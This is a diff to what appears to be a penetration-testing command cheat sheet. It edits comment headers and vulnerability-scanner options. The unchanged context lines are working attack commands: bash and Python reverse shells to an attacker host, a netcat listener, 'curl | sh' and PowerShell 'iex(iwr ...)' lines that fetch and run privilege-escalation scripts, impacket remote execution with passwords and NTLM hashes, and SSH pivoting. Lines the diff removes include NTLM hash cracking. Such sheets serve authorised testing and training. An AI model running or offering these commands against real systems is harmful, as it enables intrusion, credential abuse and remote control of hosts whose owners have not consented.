@@ -97,7 +97,7 @@ impacket-smbexec $DOMAIN/user:'Password123!'@$IP
 impacket-wmiexec -hashes :NTHASH $DOMAIN/user@$IP
 impacket-mssqlclient $DOMAIN/user:'Password123!'@$IP -windows-auth
 
-# ====== reverse shells / listeners / tty (serve the arsenal with: www) =====
+# ====== reverse shells / listeners / tty ======
 rlwrap nc -lvnp 443
 bash -c 'bash -i >& /dev/tcp/'$LHOST'/443 0>&1'
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
@@ -123,7 +123,7 @@ proxychains4 -q nxc smb $SUBNET
 ssh -D 1080 user@$IP
 ssh -L 8080:127.0.0.1:80 user@$IP
 
-# ====== linux privesc (serve these from your box: www) ======
+# ====== linux privesc (serve the script from your box with: serve) ======
 curl http://$LHOST/linpeas.sh | sh
 ./pspy64 -pf -i 1000
 sudo -l
@@ -140,15 +140,12 @@ systeminfo
 powershell -ep bypass -c "iex(iwr http://$LHOST/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck"
 net user; net localgroup administrators
 
-# ====== vuln scanning / exploit search (offline datasets) ======
-nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -u http://$IP
-nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -l scans/web-targets.txt -severity medium,high,critical
-nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -tags default-login,exposed-panel -l scans/web-targets.txt
+# ====== vuln scanning / exploit search ======
+nuclei -u http://$IP -severity medium,high,critical
+nuclei -l scans/web-targets.txt -severity medium,high,critical
+nuclei -tags default-logins,exposed-panels -l scans/web-targets.txt
 searchsploit apache 2.4
 searchsploit -m 12345
-nmap -sV --script vulscan/vulscan.nse --script-args vulscandb=cve.csv $IP
-hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r $CC_HOME/resources/data/rules/OneRuleToRuleThemAll.rule
-jq -r '.vulnerabilities[] | [.cveID,.product,.vulnerabilityName] | @tsv' $CC_HOME/resources/data/cve/kev.json | grep -i exchange
 
 # ====== scans -> kiss dashboard (importable XML) ======
 nmapx discovery -sC -T4 --open $SUBNET
